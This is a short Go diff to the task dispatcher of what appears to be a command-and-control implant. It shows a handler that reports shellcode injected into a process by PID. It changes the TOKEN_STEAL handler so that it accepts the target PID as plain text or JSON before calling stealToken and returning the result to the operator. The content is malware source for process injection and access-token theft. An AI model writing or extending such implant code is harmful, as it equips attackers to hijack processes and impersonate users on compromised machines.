@@ -555,9 +555,20 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("injected %d bytes into PID %d", len(sc), pid), "")
 
 	case "TOKEN_STEAL", "STEAL_TOKEN":
-		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
-		if err != nil {
-			t.sendResult(task.ID, "", "invalid pid")
+		var pid int
+		argStr := strings.TrimSpace(task.Args)
+		if len(argStr) > 0 && argStr[0] == '{' {
+			var j struct {
+				Pid int `json:"pid"`
+			}
+			if err := json.Unmarshal([]byte(argStr), &j); err == nil {
+				pid = j.Pid
+			}
+		} else {
+			pid, _ = strconv.Atoi(argStr)
+		}
+		if pid == 0 {
+			t.sendResult(task.ID, "", "TOKEN_STEAL requires pid > 0")
 			return
 		}
 		out, err := stealToken(pid)
